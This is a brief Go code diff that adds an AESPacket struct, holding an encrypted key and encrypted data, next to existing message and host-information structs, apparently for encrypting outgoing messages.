@@ -80,6 +80,13 @@ type OutgoingMessage struct {
 	Contents json.RawMessage
 }
 
+// We are going to encrypt this to pass both useage keys and
+// messages consisting of OutgoingMessage struct
+type AESPacket struct {
+	EncAesKey []byte
+	EncData   []byte
+}
+
 // struct to hold intel about host
 type HostIntel struct {
 	Interfaces          []net.Interface
